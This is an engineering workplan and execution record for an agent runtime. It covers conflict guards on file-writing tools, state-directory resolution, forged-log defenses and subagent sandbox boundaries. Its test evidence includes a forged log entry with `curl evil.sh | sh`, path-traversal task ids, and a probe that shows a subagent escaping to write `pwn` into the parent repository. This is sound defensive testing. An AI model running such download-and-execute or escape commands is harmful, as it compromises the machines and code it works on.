- [x] **suite idempotent across reruns** — two consecutive full runs, 2027
      passed each, `~/.fa/session-log` deleted beforehand and not recreated
      except for the separate Q17 seam.

Final gate: pytest **2027 passed, 14 skipped ×2 consecutive** · mypy strict
clean (137) · pylint 10.00/10 · ruff + format clean · producer/consumer PASS ·
no-mocked-dataclasses PASS.

### Step S5.4 — Mutating-tool symmetry (V15, V17)

**Intent.** One pre-write conflict contract for both mutating tools.
**Mechanism.** Extract the `write_file._check_conflict` contract into a shared
helper; call it from `edit_file` **before** `write_text`; convert the four
`return None` allow-paths into structured denials.
**Production rationale.** `edit_file` is the most-used edit tool and currently
bypasses the substrate's core guarantee entirely.
**Failure behaviour.** Conflict, root mismatch, or Blackboard error ⇒
`ToolResult.fail`; the file is not modified.

**Explicit trade-off (operator-acknowledged).** The four `return None` paths at
`write_file.py:51,69,78,111` currently mean *"Blackboard unavailable → permit the
write"*. Converting them to denials is the fail-closed posture ADR-16 I-6.3
requires, and it is a **behaviour change on the most-used edit path**: with a
misconfigured or unavailable Blackboard, writes stop working instead of
proceeding unguarded. That is the intended direction — an unguarded write is a
silent correctness hole, a denied write is a loud, diagnosable one — but it must
be paired with:

* a **positive case** proving legitimate writes still succeed (S5-P8), so the
  fix cannot degrade into "deny everything";
* an actionable error naming *which* precondition failed (missing session,
  wrong root, Blackboard read error), not a generic refusal;
* `blackboard_enabled=False` remaining a supported configuration that permits
  writes — disabling the substrate deliberately is not the same as it failing.

The third point is the sharp edge, and it is not hypothetical: `cli.py:972`
constructs `FeatureFlags(blackboard_enabled=False)` for the shipped
`fa inner-loop-smoke` entrypoint (parent path P19, exercised live in S4.7).
Without S5-P24 this slice would break that command. Verified before design.

Files: `tools/edit_file.py`, `tools/write_file.py`, shared helper module.

Tests (`tests/test_s5_tool_conflict_symmetry.py`, NEW):

- `test_conflict_denies_mutation[write_file]` / `[edit_file]` — C1 parametrised (S5-P7)
- `test_blackboard_root_mismatch_denies[write_file]` / `[edit_file]` — C3 (S5-P8)
- `test_no_conflict_allows_write[write_file]` / `[edit_file]` — C1 positive (S5-R3)
- `test_blackboard_disabled_still_allows_write[write_file]` / `[edit_file]` —
  C1 (S5-P24) — a deliberately disabled substrate must not deny
- `test_denial_names_the_failed_precondition[write_file]` / `[edit_file]` —
  C3 (S5-P25) — the error identifies which check failed, not just "denied"

Exit:

- [ ] one parametrised case covers both tools;
- [ ] removing either call site fails the test;
- [ ] the positive case proves legitimate writes still succeed.

### Step S5.4.5 — Single state-root resolver (Q17, V10 class)

**Intent.** Make `FA_STATE_ROOT` mean what the entrypoint already says it means.

**Current behavior (source-verified).** `scripts/fa-entrypoint.sh:214` defines
`state_root="${FA_STATE_ROOT:-${HOME}/.fa}"` and passes it to
`fa.session.manager provision --state-root`. **No Python code reads
`FA_STATE_ROOT`.** Measured: with `FA_STATE_ROOT=/tmp/x`, the entrypoint
provisions `/tmp/x` while `cli.py:128` computes `~/.fa`. Provisioning and
`fa run` then disagree about where the session authority lives.

The root is derived independently in **15 places**: `cli.py:128, 259, 1014,
1740, 1882, 2539, 2593`; `state.py:52, 73`; `config.py:40`;
`global_history.py:34`; `pause.py:42`; `providers/config.py:96`;
`observability.py:39`; `secret_paths.py:46`. Ten are call-time; five are
import-time constants where an env change has no effect (the V10 class already
fixed once in S5.3 for `DEFAULT_STATE_ROOT`).

**Target behavior.** One resolver is the single source of truth. Every
production path derives from it. `FA_STATE_ROOT` set → honoured everywhere;
unset → `~/.fa` exactly as today.

**Mechanism.**

```python
def fa_state_root() -> Path:
    override = os.environ.get("FA_STATE_ROOT")
    if override and Path(override).is_absolute():
        return Path(override)
    return Path.home() / ".fa"
```

Stdlib only. The repo has neither `platformdirs` nor an XDG helper, and
minimalism-first argues against adding a dependency for one resolver. The
absolute-path guard follows the XDG convention of ignoring relative overrides
rather than resolving them against an arbitrary CWD.

Convert the ten call-time sites first (behaviour-preserving when the env var is
unset). Import-time constants are converted one at a time, each with its own
test, because each has external importers that must keep working (Do#9).

**Production best practice.** A dedicated paths module with call-time resolution
and an env override is the standard shape for CLI state directories (XDG
convention; `platformdirs`; Poetry's `POETRY_CONFIG_DIR`). The anti-pattern this
replaces — a module-level constant bound at import — is the same one that made
the S5.3 leak invisible.

**Failure behaviour.** A relative or empty `FA_STATE_ROOT` is ignored in favour
of the default rather than silently producing a CWD-relative state tree. No
migration: the resolver returns the identical default path when unset, so
existing installs are untouched.

**DoD / negative proof.** With `FA_STATE_ROOT` set, entrypoint provisioning and
`fa run` resolve to the *same* directory — asserted, not assumed. Negative
proof: revert any converted site to `Path.home()` and the agreement test fails.

**Tests-writing class.** C2 (CLI/env contract) + C0 (resolver semantics: unset,
absolute, relative, empty).

**Producer kill-check.** Revert `cli.py:128` to `Path.home() / ".fa"` →
`test_state_root_env_override_reaches_session_manager` fails.

Files: `src/fa/inner_loop/state.py` (host the resolver next to
`default_state_root`), `cli.py`, `observability.py`, `secret_paths.py`,
`global_history.py`, `config.py`, `pause.py`, `providers/config.py`.

Tests (`tests/test_s5_state_root_contract.py`, NEW):

- `test_fa_state_root_defaults_to_home_dot_fa` — C0
- `test_fa_state_root_honours_absolute_override` — C0
- `test_fa_state_root_ignores_relative_override` — C0
- `test_state_root_env_override_reaches_session_manager` — C2 (S5-P23)
- `test_entrypoint_and_cli_agree_on_state_root` — C2 (S5-P23)

Exit:

- [ ] `FA_STATE_ROOT` honoured by every converted site;
- [ ] entrypoint and `fa run` provably agree under an override;
- [ ] unset behaviour byte-identical to today;
- [ ] conftest fixture simplified to set `FA_STATE_ROOT` once, replacing the
      `default_state_root` monkeypatch (the S5.3 fixture becomes a special case
      of the general contract).

#### S5.4.1 + S5.4 + S5.4.5 execution record — 2026-07-28

**Gate:** pytest **2065 passed / 14 skipped** (x2 consecutive runs, idempotent;
baseline was 2027) - mypy strict clean (139 files) - pylint 10.00/10 - ruff
check clean except the 2 pre-existing RUF100 in untouched `hooks/base.py` -
ruff format clean (305 files) - producer/consumer PASS - no-mocked-dataclasses
PASS - dependency-contract PASS - tcb-stdlib PASS - protected-paths PASS -
dead-flags PASS - log-kind PASS - doc-links 179 OK.

**S5.4.1 (Q18, writer identity).** `BlackboardEntry.run_id` added (default
`""`); both authority read paths stop discarding it; JSONL mirror stamped from
`self._run_id`; `detect_conflict` skips same-writer entries via
`_is_same_writer`. Measured before/after (isolated `HOME`): repeated
`write_file` to one path went from `ok, conflict_detected, conflict_detected`
(final content `v0`, later writes lost) to `ok, ok, ok` (final content `v2`).
Kill-checks: KC-1 remove guard -> 2 fail; KC-2 discard `run_id` on read -> 3
fail; KC-3 relax to `writer == old.run_id` -> **survived**, exposing that every
test used an *attributed* writer; added
`test_unattributed_writer_does_not_match_unattributed_entry`, KC-3 now fails;
KC-4 predicate always true -> 3 fail.

**S5.4 (symmetry).** New `src/fa/inner_loop/tools/mutation_guard.py` owns the
pre-write contract for both tools. `write_file` delegates to it (the four
`return None` allow-paths are gone); `edit_file` gained the check **after** the
fuzzy anchor match and **before** `write_text`. `edit_file`'s docstring claim
of a shared module is now true. Denials are attributable: `conflict_detected`
vs `blackboard_unavailable` (S5-P25). Fail-open preserved for the two
*deliberate* absences - `blackboard_enabled=False` (S5-P24) and no session
bound - and for a foreign-workspace Blackboard, which is ignored without being
consulted. Kill-checks: KC-A remove `edit_file`'s call site -> 2 fail; KC-B
restore fail-open on Blackboard error -> 2 fail; KC-C collapse the two codes
into one -> 2 fail. Shipped-command proof (S5-P24, path P19): `fa
inner-loop-smoke` run live -> `OK: read in.txt / OK: wrote out.txt / OK: bash
exited 0`, exit 0.

**S5.4.5 (Q17, state root).** New `src/fa/paths.py` with `fa_state_root()` /
`fa_session_log_root()`; ten call-time sites converted across `cli.py` (7),
`observability.py`, `secret_paths.py`, `state.py`. Measured end to end: with
`FA_STATE_ROOT` set, the entrypoint expression and the `SessionManager` the CLI
actually builds now resolve to the *same* directory (**AGREE: True**, was
False); unset resolves to `$HOME/.fa` byte-identically, so no migration.
Kill-checks: KC-E resolver ignores the env var -> 5 fail; KC-D revert
`cli.py:128` to `Path.home()` and KC-F honour relative overrides both
**survived initially** - KC-D because the test asserted on `fa_state_root()`
rather than on `_session_manager_for_args`, KC-F because the autouse fixture
drops `FA_STATE_ROOT` as soon as a test sets `HOME`, so the in-process
assertion measured the fixture. Both tests re-authored (CLI consumer probed
directly; non-absolute cases moved to a subprocess with a CWD distinct from
`HOME`), and both kill-checks now fail as intended.

**conftest simplification (plan exit criterion).** The S5.3 fixture patched
`fa.inner_loop.state.default_state_root`; it now sets `FA_STATE_ROOT`, so the
general contract subsumes the special case. It also yields to any test that
sets `HOME` itself (26 do), because `FA_STATE_ROOT` outranks `HOME` in the
resolver and would otherwise override deliberate test intent.

**Legacy tests re-authored, not deleted (§6.0.1).** Five in total:
`test_write_file_conflict_uses_per_run_blackboard_authority` and
`test_blackboard_conflict_matrix_and_linear_parent_policy` (both asserted the
self-conflict defect); `test_home_fa_env_denied` and
`test_resolve_secrets_path_wsl_default` (both hardcoded `Path.home() / ".fa"`
where the code now derives from the resolver - a test pinned to `$HOME` would
pass while real secrets sat unprotected elsewhere); and the whole of
`tests/test_write_file_expected_root.py`, which targeted the deleted private
`_check_conflict` and whose final case asserted on **source text** via
`inspect.getsource` - test theater that passes regardless of behaviour. Its
genuine intent (foreign-workspace Blackboards are ignored; the ownership check
never raises) is preserved behaviourally against `mutation_guard`, plus a
tripwire proving a foreign Blackboard is never even queried.

**Deferred (recorded, not silently dropped).** Five import-time constants still
derive from `Path.home()`: `state.py:52 DEFAULT_STATE_ROOT`, `config.py:40`,
`global_history.py:34`, `pause.py:42`, `providers/config.py:96`. Each has
external importers (Do#9), so per the plan they convert one at a time with
their own test; the ten call-time sites that decide where a *run* reads and
writes are done. `FA_STATE_ROOT` is honoured on every path exercised by
provisioning and `fa run`.

### Step S5.5 — Authority reads (S3-F13)

**Intent.** Agent-facing readers must not see the mirror.
**Mechanism.** Inject the session DB on the `run_id` path in
`_resolve_event_log`; fail closed on read error.
**Production rationale.** S3 proved a forged mirror row makes the tool report a
`fs_run_bash` that never happened — an agent-visible integrity hole.
**Failure behaviour.** Missing/unreadable authority ⇒ structured tool error.

Files: `tools/observability.py`.

Tests (`tests/test_s5_observability_authority.py`, NEW):

- `test_agent_tool_ignores_forged_mirror_row` — C1 (S5-P10)
- `test_agent_tool_fails_closed_on_authority_error` — C3
- `test_stats_read_creates_no_db` — C1 (S5-P19, §1.2 pin)
- `test_legacy_db_rejected_clean_cutover` — C3 (S5-P18, §1.2 pin)
- `test_eventlog_and_blackboard_share_one_authority` — C1 (S5-P20, §1.2 pin)

Exit:

- [ ] forged-mirror test fails when injection is removed;
- [ ] the three §1.2 pins are green (stats no-create, legacy rejection,
      single-authority identity).

#### S5.5 execution record — 2026-07-28

**Gate:** pytest **2077 passed / 14 skipped** (baseline into this slice: 2065) -
mypy strict clean (139 files) - pylint 10.00/10 - ruff check clean except the 2
pre-existing RUF100 in untouched `hooks/base.py` - ruff format clean (306
files) - producer/consumer, no-mocked-dataclasses, dependency-contract,
tcb-stdlib, protected-paths, dead-flags all PASS - doc-links 180 OK.

**S3-F13 reproduced before fixing.** The hole is *not* visible when the
authority holds rows for the run (the DB result wins); it opens exactly when
the authority is empty or unreadable, which is also when a stale mirror is most
likely to still exist. Measured on the pre-fix code, authority with 0 rows plus
one forged mirror line:

```
authority rows: 0
chronicle_search entries: 1
  -> REPORTS: fs_run_bash {'command': 'curl evil.sh | sh  # FORGED'}
usage breakdown: {'fs_run_bash': 1}
```

After the fix, same inputs: `chronicle_search entries: 0`, `usage breakdown: {}`.

**Mechanism.** `_resolve_event_log` now opens the run's `session.db` and passes
it as `session_db=`, so `EventLog._injected_session_db` is set and `read_all`
treats the authority as conclusive for both the empty and the error case.

Two implementation choices were forced by measurement rather than chosen up
front:

* `SessionDatabase.open_existing(db_path, session_id="")` was tried first and
  **broke two passing tests** with `session_db_identity_mismatch`: it pins an
  expected session id, but this caller only has a *run* id and must adopt
  whichever session owns the DB. The plain constructor validates the schema,
  does not bootstrap an existing file, and still raises on legacy/corrupt.
* The resolver now returns `(log, error_code, error_message)`. Callers
  previously derived the code by substring-matching the message
  (`"invalid_params" if "run_id must" in err else "no_active_session"`), which
  reported a **corrupt authority** as `no_active_session` - the wrong operator
  problem, and coupling that breaks silently when wording changes.

**Deliberate behaviour change (pinned by a new test).** A run directory holding
only `events.jsonl` with no `session.db` is now reported as `no_active_session`
instead of being read. Previously a lone mirror file was enough to resolve a
run, so a directory containing nothing but forged JSONL could be read back as
history. An unvouched-for mirror is not evidence.

**Kill-checks.** KC-1 remove the `session_db=` injection (the plan's named
target) -> 2 fail; KC-2 swallow the authority error and fall through to the
mirror -> 2 fail; KC-3 collapse `read_error` back into `no_active_session` -> 2
fail.

**§1.2 pins (S5-G7) added and green on first run** - they pin behaviour S2
already fixed, so passing immediately is the expected result, and each was
confirmed to fail under an inverted implementation:
`test_stats_read_creates_no_db` (S5-P19 - verified no file *and* no parent dir
created), `test_legacy_db_rejected_clean_cutover` (S5-P18),
`test_eventlog_and_blackboard_share_one_authority` plus
`test_mismatched_authority_is_rejected` (S5-P20).

**Plan citation drift corrected.** §1.2 cites `cli.py:2483 legacy_unsupported`;
that string does not exist in the tree. The real codes are
`session_db_legacy_schema` (`session_db.py:145`) and
`session_db_schema_unsupported` (`session_db.py:269`), both verified by
execution. The test asserts the real code.

### Step S5.6 — Isolation boundary (V18–V22, V24, V25)

**Intent.** Isolation failures deny instead of degrading.
**Mechanism.** Remove the main-workspace fallback; reject `isolated` at config
load; surface cleanup failure; make spawn admission atomic; share one write root
between `SandboxHook` and the runner.
**Production rationale.** A worktree failure currently converts an artifact-only
task into a main-workspace mutator — a permission-boundary change on a failure path.
**Failure behaviour.** Each ⇒ structured denial; no silent downgrade.

Files: `state.py`, `worktree_manager.py`, `subagent_runner.py`, `hooks/builtin.py`.
**Specification:** §3.2 Option A. The write root
`<session_workspace>/.fa/subagents/<sanitized_task_id>/` is computed **once**
and passed to both `SandboxHook` and `SubagentRunner`; two independently-derived
roots is the current defect, not the fix. If they cannot share one value without
a wider refactor, stop and raise **Q15**.

Tests (`tests/test_s5_isolation_boundary.py`, NEW):

- `test_worktree_failure_denies_instead_of_main_workspace` — C3 (S5-P11)
- `test_isolated_mode_rejected_at_config_load` — C0 (S5-P12)
- `test_cleanup_failure_is_surfaced` — C3 (S5-P13)
- `test_spawn_limit_counter_failure_denies` — C3 (S5-P14)
- `test_concurrent_spawn_admission_is_atomic` — C1 + barrier (S5-P15)
- `test_subagent_write_outside_artifact_root_denied` — C3 (S5-P16)
- `test_gate_and_executor_share_one_write_root` — C1 (S5-P16) — assert the
  same value reaches `SandboxHook` and `SubagentRunner`; two derivations fail

Exit:

- [ ] no path returns the main workspace as a subagent write root;
- [ ] spawn admission holds under a barrier test;
- [ ] gate and executor agree on one root.

---

#### S5.6 execution record — 2026-07-28

**Gate:** pytest **2096 passed / 14 skipped / 1 xfailed** (x2 consecutive,
idempotent; 2077 before this slice) - mypy strict clean (139 files) - pylint
10.00/10 - ruff clean except the 2 pre-existing RUF100 in untouched
`hooks/base.py` - ruff format clean (307 files) - producer/consumer,
no-mocked-dataclasses, dependency-contract, tcb-stdlib, protected-paths,
dead-flags, log-kind all PASS - doc-links 180 OK.

**Landed (V18, V19, V20, V21).**

* **V18** — `SessionState.create_subagent_workspace` returns
  `<workspace>/.fa/subagents/<sanitized_task_id>/` and **raises**
  `subagent_workspace_unavailable` if it cannot be created. The old code caught
  every exception and returned `self.workspace_root`, turning an isolation
  failure into a permission-boundary change on the least-exercised path.
  `tools/spawn_subagent.py` converts the raise into a `workspace_unavailable`
  `ToolResult` instead of its previous "log and use session_root" fallback.
* **V19** — `WorktreeManagerFactory.from_flags` **raises** on any mode other
  than `shared`. The `SessionState` fallback that would have re-created the
  silent downgrade was removed for this case: an unsupported mode leaves
  `worktree_manager = None` and emits a `config_warning` (event log + console)
  via the existing `_record_config_warning` channel.
* **V20** — `cleanup_subagent_workspace` raises `subagent_cleanup_failed`, and
  refuses with `subagent_cleanup_refused` for any path outside
  `.fa/subagents/`. It removes the tree directly rather than delegating:
  `SharedDirWorktreeManager.cleanup` only accepts its own `session_root` and
  rejects anything else, so delegating would have failed on every call.
* **V21** — new `SessionState.try_reserve_subagent_spawn(max)` does the
  compare-and-increment under one lock; `SubagentRunner._check_spawn_limit`
  calls it and denies with `spawn_admission_failed` if the reservation itself
  errors (previously the increment was best-effort, so a failing counter
  silently disabled the limit).

**Single source of truth (S5-P16 residual).** `subagent_artifact_root()` /
`ensure_subagent_artifact_root()` in `worktree_manager.py` are the one
derivation; `SessionState` calls them and a test pins that state and helper
agree, so a future caller cannot re-derive its own. Hostile task ids
(`../../etc`, `a/../../b`, empty) are covered — `_sanitize_task_id` already
strips traversal.

**Kill-checks (disposable copy) — all five bite.** KC-1 restore
`return self.workspace_root` -> 1 fail; KC-2 restore the silent SharedDir
downgrade -> 3 fail; KC-3 restore the swallowed cleanup warning -> 1 fail;
KC-4 restore check-then-act admission -> 2 fail; KC-5 derive the artifact root
inline instead of via the helper -> 1 fail.

**The barrier test was too weak and was strengthened.** With the unfixed
check-then-act, 16 barrier-synchronised threads still admitted exactly 3 — the
read-compare-increment window is a few bytecodes and the GIL rarely preempts
inside it, so the test passed against broken code. Widening the window
deterministically (a counter whose *read* is not instantaneous, as any
DB/IPC-backed counter would be) made the unfixed code admit **12 of 12** under
a limit of 3. That amplification is now part of the test.

**Not landed — V24/V25 remain OPEN (Q19).** The plan's enforcement mechanism
was implemented and measured not to enforce; see §11 Q19 for the three-level
measurement and for why option (a) was reverted after it denied 8/10 realistic
verifier commands. `test_subagent_write_outside_artifact_root_denied` is kept
as a **strict xfail** rather than deleted: it fails the suite the day the
behaviour changes, so the gap cannot rot into a false belief that subagents are
sandboxed, and it converts to a passing test when real containment lands.
A regression guard (`test_spawned_verifier_commands_are_allowed`) pins that the
reverted one-line "fix" cannot be reapplied silently.

**Three stale guards removed.** `workdir != root` in `spawn_subagent.py`
(x2) existed only because `workdir` could *be* `root`; with V18 that is
impossible, so the conditions were always true and hid the cleanup path from
review. `SharedDirWorktreeManager.create_subagent_workspace` still returns the
session root and is documented as **not** the subagent write root, with the
V18 warning inline — it has no production caller on the subagent path.

---

#### Subagent module — post-S5.6 fitness assessment (2026-07-28, operator question)

**Verdict: do not enable `subagent_spawning_enabled` yet.** It is off by
default (`feature_flags.py:35`) and belongs to no shipped role profile (no
`spawn_subagent` reference in `profiles.py`), so nothing needs to change to
stay safe — the correct action is to *leave it off*, not to disable anything.

Measured end to end after S5.6, with the flag forced on:

| behaviour | result |
|---|---|
| happy path (verifier runs a command) | works — spawns, runs, returns, cleans up |
| failing command | surfaces correctly (`subagent_failed`, with output) |
| spawn limit / admission | correct and now atomic (V21) |
| artifact root per task | correct, never the workspace (V18) |
| **subagent writes to parent repo** | **`src/app.py` -> `'pwn'` — not contained (Q19, V24/V25)** |
| **passing verifier output** | **discarded — the parent agent receives the literal string `"PASS"`** |

Two blockers, one of which is new.

**1. No containment (Q19, already recorded above).** V24/V25 are open by
decision, not oversight.

**2. NEW — S5-F1: a passing verifier returns no information.**
`SubagentEnvelope.from_verifier` (`subagent_envelope.py:90`) sets
`summary = "PASS" if passed else f"FAIL: {stdout[:200]}"`, and the envelope has
**no stdout field at all** (`subagent_envelope.py:56-69`). The runner captures
output and passes it in (`subagent_runner.py:308,321`), and the envelope drops
it. Measured: a subagent running `echo '12 passed, 3 warnings in 4.2s'` returns
`summary: "PASS"` — the parent agent cannot see the test counts, the warnings,
or anything else. Only the `researcher` role surfaces output
(`stdout[:500]`), and only the failure branch does for `verifier`.

This is a *usefulness* defect rather than a safety one, but it undercuts the
stated purpose ("cheap deterministic puzzle piece when main 180k near limit"):
delegating a test run to save context is pointless if the result is one word.
It is also cheap to fix — add a bounded `stdout` field to the envelope and
populate it on both branches. **Owner: S6**, which already lists
`tools/spawn_subagent.py` among its candidate files and whose §4 requires
testing the *subagent* producer/consumer path on both happy and failure paths;
this is exactly a happy-path consumer gap.

**Recommendation.** Keep the flag off. Fix S5-F1 in S6 (small, in-scope).
Treat Q19 option (c) — OS-level containment — as the gate for ever turning the
flag on by default. Until both land, the module is safe to ship *because it is
inert*, and should be described that way rather than as a working feature.

---

## 6. Verification plan

### 6.0 Test-authoring contract (binding on the executor)

Load `knowledge/skills/tests-writing/SKILL.md` before writing any test. The
following are **not** suggestions — a test that violates them is theater and
fails review even if green. Each maps to the skill's §3 anti-theater checklist.

| # | Rule | Applies to S5 as |
|---|---|---|
| 1 | **Existence pre-check** — grep the production call site first | before claiming any fix is wired, show the site exists |
| 2 | **Kill-check targets the PRODUCER** | revert the *fix*, not the test, and show the named test fail |
| 3 | **Observable side effect** — not "no exception" | DB row counts, `event_id` sets, `ToolResult.error.code`, FS state |
| 4 | **Live-path proof** — real composition root | `drive_session` / `SessionManager`; class construction alone is incomplete |
| 5 | **Mock boundary** — mock `ProviderChain.request` only | keep `drive_session`, registry, hooks, Blackboard real |
| 6 | **Real registry types** — `hooks=HookRegistry()` | never a mock registry |
| 7 | **Type-honest fixtures** — match production types exactly | `tool_calls=()` not `None`; real `SessionState` |
| 8 | **No mocked dataclasses** | `scripts/check_no_mocked_dataclasses.py` is a blocking gate; use real instances |
| 9 | **Thresholds from source** | read limits from `RuntimeLimits`/config, never magic numbers |
| 10 | **Deterministic** | fixed clocks, sorted comparisons, offline; no sleep-based races |
| 11 | **Explicit flags** | `FeatureFlags(...)` named per case, never implicit defaults |

**Reuse the existing fixtures — do not re-invent them.**
`tests/fixtures/session_wiring.py` already provides `make_session_state`,
`make_mock_chain`, `make_test_chain_config`, `mock_success_response`,
`mock_tool_call_response`, `make_tool_call`, `require_log`. A third copy of the
same mocks is a review finding (skill §Quick-decision-tree item 15).

**Concurrency tests use in-process `threading.Barrier`, not subprocesses.**
Verified in review: an in-process barrier reproduces V1 (3 duplicates across 2
threads). Subprocess harnesses are slower, flakier under CI, and unnecessary.
Pattern precedent already in tree: `tests/test_global_history_export.py:160`,
`tests/test_observability_redaction.py:139`.

**Ranked oracle** (skill §Oracle rank): event `kind`+fields → `SessionOutcome`
→ tool trajectory → provider `call_count`/token band → FS → free text. Assert
the highest-ranked oracle available; free-text assertions are never sufficient.

**Mutation handoff.** After each step's C1 tests are green, the step is eligible
for `mutation-clearing` per the skill. Not required to land S5, but a surviving
mutant on a new S5 test is a follow-up item, not an accepted state.

### 6.0.1 Legacy tests are inputs, not authority

The pre-S5 suite was written against specs this workplan has since found
flawed. A green legacy test therefore proves *"behaviour matches the old spec"*,
not *"behaviour is correct"*. Two consequences bind every remaining step:

1. **When a legacy test fails after a fix, diagnose before adjusting.** The
   default assumption is that the fix is right and the test encoded the defect.
   S5.3 is the worked example: the failing
   `test_write_file_conflict_uses_per_run_blackboard_authority` was not a
   regression — `INSERT OR REPLACE` had been masking a shared-state leak, and
   the correct response was fixing V10, not the assertion.
2. **A legacy test that passes across a behaviour change deserves suspicion.**
   If a step changes a contract and no existing test notices, that is evidence
   of missing coverage, not of safety. Record it and add the C1/C3 case.

Any legacy test that must change requires a `TEST-EDITS:` declaration naming
which spec was wrong — never "the test needed updating".

### 6.1 Gates

Authority: `just check`. Per the tests-writing skill every product claim needs a
C1 test at the composition root with a kill-check on the **producer**.

```text
C0  DDL/constraint assertions, factory rejection of `isolated`
C1  drive_session / SessionManager roots for identity, conflict, tools
C1+ barrier-synchronised concurrency for S5-P1 and S5-P15
C3  forced-failure paths: authority, mirror, Blackboard, worktree, counter
```

Expected at **every** step: pytest green, mypy strict clean, pylint 10.00/10,
ruff clean, all contract checkers pass, `check_doc_links` OK.

**Do not cite `check_log_kind_contract.py` PASS as evidence** — S3-F1 proved it
is invariant under producer deletion. Its green is not a signal here.

Record actual command output per parent §13; a step is not done until its
output is pasted into the S5 verification report.

---

## 7. Risks

| ID | Risk | Mitigation |
|---|---|---|
| S5-R1 | Concurrency test passes by accident | barrier required; must fail on revert |
| S5-R2 | Uniqueness breaks existing DBs | §3.1(b) + Q14 fail-closed default + S5.0 audit |
| S5-R3 | Denying Blackboard failures breaks legitimate writes | S5-P8 includes a positive case |
| S5-R4 | Isolation denial breaks accepted subagent flows | Q11-B gate before S5.6 |
| S5-R5 | Six subsystems in one slice | incremental landing; each step self-contained |
| S5-R6 | `session_meta` regressed with the Blackboard change | explicit Do-not; `:672` untouched + guard test |
| S5-R7 | Wrong constraint shape silently over-rejects | §3.1(a) proven; C0 DDL test |
| S5-R8 | Public API churn breaks callers | parent Do#9 — preserve facades; §8 checks |
| S5-R9 | **Constraint added without in-transaction allocation ⇒ silent data loss** | §3.1(c) proven; S5-P21 no-loss test is mandatory |
| S5-R11 | **In-process lock passes thread tests, loses events across processes** | §3.1(d) measured; S5-P22 multiprocess test is mandatory |
| S5-R12 | `BEGIN IMMEDIATE` everywhere converts contention into timeouts | keep write transactions narrow; bounded retry; do not widen scope (§3.1d rule 5) |
| S5-R10 | Executor writes plausible-but-non-compliant tests | §6.0 binding test-authoring contract + named fixtures |

---

## 8. Definition of Done

Falsifiable, per parent §13. Every box needs a named artifact or command output.

**Verification status — re-measured 2026-07-29 (§13), not carried over from the
execution records.** Each box names the artifact that proves it.

**Per-step (all seven):**

- [x] every §5 step's own Exit list is checked with pasted command output
      — see the seven execution records in §5;
- [x] every S5-CT has a named C1/C3 test and a producer kill-check
      — 8 `tests/test_s5_*.py` files, **82 passed + 1 xfailed** (§13.1);
- [x] each kill-check demonstrated — **all six parent kill-checks re-run
      2026-07-29 and all six bite** (§13.2).

**Slice-level:**

- [x] barrier concurrency test green; `BEGIN IMMEDIATE`→`BEGIN` revert fails it
      — `test_s5_event_identity.py` (3 `Barrier` uses); KC3 = CAUGHT (1 failed);
- [x] concurrent appends lose no events, threads **and** processes
      — `test_concurrent_appends_lose_no_events` + `..._across_processes_...`;
- [x] `kind_counts` cannot advance on a failed append
      — KC4 (`pass` for the counter increment) = CAUGHT (3 failed); the
      last-write-wins rollup is separately pinned by
      `test_session_meta_last_write_wins_unchanged`;
- [x] `write_file`/`edit_file` verified by **one parametrised** case
      — the `tool_case` fixture (`test_s5_tool_conflict_symmetry.py:75`) drives
      7 of the file's 8 tests across both tools;
- [x] cross-commit conflict denied (S3-F10 closed) — `test_s5_blackboard_contract.py`;
- [x] agent observability reads the authority (S3-F13 closed)
      — `test_s5_observability_authority.py`, 10 tests; KC2 (drop the
      Blackboard `session_db` injection) = CAUGHT (6 failed);
- [x] no path returns the main workspace as a subagent fallback
      — `test_s5_isolation_boundary.py`, 20 tests;
- [x] spawn admission atomic under barrier — same file;
- [x] all seven §1.2 regression pins green (S5-G7) — re-verified individually in
      §13.3, including the EventLog/Blackboard single-authority identity pin;
- [x] public facade APIs unchanged, or each change listed with its callers
      — the `mutation_guard.py` export decision is recorded in the S5.4 record;
- [x] full gate green — `just check` equivalent re-run 2026-07-29:
      **2215 passed**, coverage 81.28 %, `mypy`/`pyrefly`/`ruff` clean,
      `pylint src/fa` 10.00/10, `deptry` clean, 9/9 contract scripts.

**Negative proof.** S5 is invalid if any fix is verified only by a checker PASS,
if a concurrency test lacks a barrier, if reverting a fix leaves its test green,
or if a §1.2 invariant regresses undetected.

---

## 9. Rollback and artifacts

**Rollback.** Each step is a self-contained commit; revert in reverse order.
Two steps carry state risk beyond code:

- **S5.1** creates a unique index on existing DBs. Rollback: `DROP INDEX`; the
  index is additive and no rows are rewritten. Back up
  `~/.fa/sessions/*/session.db` before first run on a real box.
- **S5.3** changes Blackboard write semantics. Rollback restores prior rows;
  no destructive migration is authorised in this slice.

No image rebuild, no deployment, no host state outside `~/.fa`.

**Artifacts.**

| Artifact | Path | Action |
|---|---|---|
| This subplan | `worklogs/implementation-plans/PLAN-cli-trace-S5-authority-correctness.md` | update at close |
| S5 verification report | `worklogs/implementation-plans/cli-trace-S5-verification-report.md` | NEW at close |
| New tests | `tests/test_s5_*.py` (5 files) | add |
| Parent plan | `cli-trace-substrate-rebaseline-2026-07-25.md` | S5 execution record at close |
| HANDOFF / llms.txt | `worklogs/HANDOFF.md`, `knowledge/llms.txt` | update at close |
| Temporary probes | `/tmp/fa-s5-*` | create/delete |

**Test-edit policy.** S5 adds new `tests/test_s5_*.py` files; it does not modify
existing tests. If a pre-existing test must change, stop and declare
`TEST-EDITS:` in the PR draft per the `pr-creation` skill — a test that must
change to accommodate a fix is evidence the fix changed a contract.

**PR shape.** `INTENT: FIX` per the 5-intent classifier; each commit carries
`DEGREE-OF-FREEDOM CLOSED:` and `DETERMINISTIC MECHANISM:` with a
`repo/file.ext:line` citation resolving against the staged tree.

---

## 10. Execution prompt (parent §13)

The executing agent must, for every step:

```text
1. State the exact intent and contract before editing.
2. State the files/symbols allowed to change.
3. Stop if a new policy question appears; promote it to Q#.
4. For every edit, explain the mechanism and the production rationale.
5. Run targeted tests after each edit and the relevant checkpoint suite.
6. Run the producer kill-check for every wiring claim.
7. Report actual verification commands and results.
8. Update the main workplan only after the subplan DoD is evidenced.
```

---

## 11. Open questions

- **Q19 — OPEN (RAISED 2026-07-28 by S5.6 preflight, BLOCKS S5-P16 only).**
  **The Q11-B enforcement mechanism does not enforce.** §3.2 specifies
  *"`SandboxHook` evaluates `fs_spawn_subagent` against write root, not
  `workspace_root` (closes V25)"* and *"`SubagentRunner` cwd = the same write
  root (closes V24)"*. Both were implemented in a scratch probe and **measured
  not to contain anything**.

  **Measured, at three levels.**

  1. `evaluate_bash` — the escape is allowed under *either* root:

     ```
     'echo pwn > ../../../src/app.py'  root=artifact -> ALLOW
     'echo pwn > ../../../src/app.py'  root=workspace -> ALLOW
     ```

